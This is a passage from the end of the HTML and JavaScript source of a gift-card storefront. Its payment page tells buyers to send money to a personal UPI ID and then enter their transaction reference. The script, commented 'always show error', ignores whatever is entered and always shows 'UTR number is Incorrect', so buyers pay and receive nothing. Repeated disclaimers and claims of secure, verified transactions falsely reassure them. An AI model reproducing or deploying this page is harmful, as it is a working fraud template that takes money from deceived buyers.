                        <p class="price">₹4600</p>
                        <button class="btn btn-buy" onclick="showPage('payment')">Buy Now</button>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <!-- PAYMENT PAGE -->
    <main id="payment" class="page">
        <section class="payment-section">
            <div class="container">
                <h2>Complete Your Payment</h2>

                <div class="payment-box">
                    <div class="upi-id-box">
                        <span class="upi-label">Send payment to UPI ID:</span>
                        <div class="upi-value">voltexsaha@fam</div>
                    </div>

                    <form id="paymentForm">
                        <div class="form-group">
                            <label for="utr">UTR / Reference Number</label>
                            <input type="text" id="utr" name="utr" placeholder="e.g., 123456789012" required />
                        </div>

                        <div class="form-group">
                            <label for="txnId">Transaction ID</label>
                            <input type="text" id="txnId" name="txnId" placeholder="e.g., TXN123456789" required />
                        </div>

                        <div class="form-group">
                            <label for="amount">Transaction Amount (₹)</label>
                            <input type="number" id="amount" name="amount" placeholder="e.g., 500" min="500" required />
                        </div>

                        <button type="submit" class="btn submit-btn">Verify Payment</button>
                    </form>
                </div>

                <div id="errorMsg" class="error-message">
                    UTR number is Incorrect
                </div>

                <div class="legal-note">
                    <p>
                        This website does not promote any illegal activities. It only sells gift cards for a specific app.
                        All transactions are secure and verified.
                    </p>
                </div>

                <div class="back-link">
                    <a onclick="showPage('home')">← Back to Cards</a>
                </div>
            </div>
        </section>
    </main>

    <!-- ABOUT PAGE -->
    <main id="about" class="page">
        <section class="about-section">
            <div class="container">
                <h2>About Us</h2>
                <p>
                    International Gift Card is a legitimate platform for buying pre-registered virtual gift cards
                    containing Play Points balance for a specific app.
                </p>
                <p>
                    Our mission is to provide a safe, secure, and easy way to purchase digital gift cards online.
                    All cards are pre-loaded with the specified balance and delivered securely after payment verification.
                </p>

                <h3>Legal Disclaimer</h3>
                <p>
                    This website does not promote any illegal activities. It only sells gift cards for a specific app.
                    We comply with all applicable laws and regulations. By using this site, you agree to our terms of service.
                </p>

                <h3>Security</h3>
                <p>
                    All card details (card number, CVV, expiry) are masked for your security.
                    We never store or share your personal payment information.
                </p>
            </div>
        </section>
    </main>

    <!-- CONTACT PAGE -->
    <main id="contact" class="page">
        <section class="contact-section">
            <div class="container">
                <h2>Contact Us</h2>
                <p>Have questions? Reach out to us using the form below.</p>

                <form id="contactForm" class="contact-form">
                    <input type="text" name="name" placeholder="Your Name" required />
                    <input type="email" name="email" placeholder="Your Email" required />
                    <textarea name="message" placeholder="Your Message" rows="5" required></textarea>
                    <button type="submit" class="btn">Send Message</button>
                </form>

                <div class="contact-info">
                    <p><strong>Address:</strong> Dibrugarh, Assam, India</p>
                    <p><strong>Email:</strong> support@internationalgiftcard.com</p>
                </div>
            </div>
        </section>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2025 International Gift Card. All rights reserved.</p>
            <p class="disclaimer">
                This website does not promote any illegal activities. It only sells gift cards for a specific app.
            </p>
            <p class="address">Dibrugarh, Assam, India</p>
        </div>
    </footer>

    <script>
        // Page navigation
        function showPage(pageId) {
            // Hide all pages
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            // Show selected page
            document.getElementById(pageId).classList.add('active');

            // Update nav active state (only for home, about, contact)
            document.querySelectorAll('nav a').forEach(link => {
                link.classList.remove('active');
            });

            if (pageId === 'home') {
                document.getElementById('nav-home').classList.add('active');
            } else if (pageId === 'about') {
                document.getElementById('nav-about').classList.add('active');
            } else if (pageId === 'contact') {
                document.getElementById('nav-contact').classList.add('active');
            }

            // Scroll to top
            window.scrollTo(0, 0);
        }

        function scrollToProducts() {
            showPage('home');
            setTimeout(() => {
                document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }

        // Payment form submission - always show error
        const paymentForm = document.getElementById('paymentForm');
        const errorMsg = document.getElementById('errorMsg');

        if (paymentForm && errorMsg) {
            paymentForm.addEventListener('submit', (e) => {
                e.preventDefault();

                // Always show error
                errorMsg.style.display = 'block';

                window.scrollTo(0, 0);
            });
        }

        // Contact form
        const contactForm = document.getElementById('contactForm');
        if (contactForm) {
            contactForm.addEventListener('submit', (e) => {
                e.preventDefault();
                alert('Thank you! Your message has been sent.');
                contactForm.reset();
            });
        }
    </script>
</body>
</html>
